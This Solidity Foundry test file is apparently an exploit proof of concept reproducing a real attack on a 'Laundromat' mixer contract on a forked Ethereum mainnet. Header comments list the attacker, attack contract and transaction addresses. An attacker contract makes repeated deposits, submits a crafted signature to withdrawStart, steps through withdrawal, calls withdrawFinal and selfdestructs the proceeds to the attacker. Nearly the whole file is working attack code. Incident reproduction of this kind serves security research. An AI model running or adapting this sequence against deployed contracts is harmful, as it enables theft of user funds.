pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1.5K USD
// Attacker : https://etherscan.io/address/0xd6be07499d408454d090c96bd74a193f61f706f4
// Attack Contract : https://etherscan.io/address/0x2e95cfc93ebb0a2aace603ed3474d451e4161578
// Vulnerable Contract : https://etherscan.io/address/0x934cbbe5377358e6712b5f041d90313d935c501c
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x08ffb5f7ab6421720ab609b6ab0ff5622fba225ba351119c21ef92c78cb8302c

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x934cbbe5377358e6712b5f041d90313d935c501c

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1909814943290884596
// Twitter Guy : https://x.com/TenArmorAlert/status/1909814943290884596
// Hacking God : N/A

address constant Laundromat = 0x934cbbE5377358e6712b5f041D90313d935C501C;
address constant addr1 = 0x2E95CFC93EBb0a2aACE603ed3474d451E4161578;
address constant attacker = 0xd6BE07499d408454D090c96bd74A193F61f706F4;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 22222687-1);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0x2E95CFC93EBb0a2aACE603ed3474d451E4161578
contract AttackerC {
    constructor() { 
        if (address(this) == addr1) {
            // deposit() x4
            (bool s1,) = Laundromat.call(abi.encodeWithSelector(ILaundromat.deposit.selector,
                0x53fc1ed6fc846bb1bb169b59c0f09b68c5489f92a52de825288380980c45ca8a,
                0xdd3a0e9477d9e2f82be3b891061fb1d435839c670ff6aa61183f5ee01d52d3b6
            ));
            require(s1);
            (bool s2,) = Laundromat.call(abi.encodeWithSelector(ILaundromat.deposit.selector,
                0x53fc1ed6fc846bb1bb169b59c0f09b68c5489f92a52de825288380980c45ca8a,
                0xdd3a0e9477d9e2f82be3b891061fb1d435839c670ff6aa61183f5ee01d52d3b6
            ));
            require(s2);
            (bool s3,) = Laundromat.call(abi.encodeWithSelector(ILaundromat.deposit.selector,
                0x53fc1ed6fc846bb1bb169b59c0f09b68c5489f92a52de825288380980c45ca8a,
                0xdd3a0e9477d9e2f82be3b891061fb1d435839c670ff6aa61183f5ee01d52d3b6
            ));
            require(s3);
            (bool s4,) = Laundromat.call(abi.encodeWithSelector(ILaundromat.deposit.selector,
                0x53fc1ed6fc846bb1bb169b59c0f09b68c5489f92a52de825288380980c45ca8a,
                0xdd3a0e9477d9e2f82be3b891061fb1d435839c670ff6aa61183f5ee01d52d3b6
            ));
            require(s4);

            // withdrawStart(signature[], x0, Ix, Iy)
            uint256[] memory sig = new uint256[](5);
            sig[0] = 0x33f79225929030e6369f0fbf5500142b8a4e10370e35f701a0e5c4d324f098d6;
            sig[1] = 0x93708ff3b6dcb272664acb22881510360a04ca1a0a05a8dda37d06ddc62e5bf0;
            sig[2] = 0xec91250cc040f420bdd11eb4b77cbf1d659ed043e88dbe49b392d44a85453e04;
            sig[3] = 0xddaef0451b6c22a35bc641cd5f66aae904351f8adca3e588f0385d9d0bec542f;
            sig[4] = 0x2652c96f86b22f421949daee41ffef503df3a06072e372de15105d0783bc2ba3;

            (bool s5,) = Laundromat.call(abi.encodeWithSelector(
                ILaundromat.withdrawStart.selector,
                sig,
                0xa844d117805bbe3b276c37582fc1f960b5870ccd0d1016ec39a2b32a5bc780cf,
                0x3184ac964636725c9c94d3767739fd89fc58da189ef8579409052b860e00b28f,
                0xd7b3de3e1198ad3c53db7b873132bd16741f130d8fe73e801b281182cc3da487
            ));
            require(s5);

            // withdrawStep() x5
            for (uint256 i = 0; i < 5; i++) {
                (bool ss,) = Laundromat.call(abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
                require(ss);
            }

            // withdrawFinal()
            (bool sf,) = Laundromat.call(abi.encodeWithSelector(ILaundromat.withdrawFinal.selector));
            require(sf);

            selfdestruct(payable(attacker));
        }
    } 
}

interface ILaundromat {
	function deposit(uint256, uint256) external;
	function withdrawFinal() external returns (bool);
	function withdrawStart(uint256[] calldata, uint256, uint256, uint256) external;
	function withdrawStep() external; 
}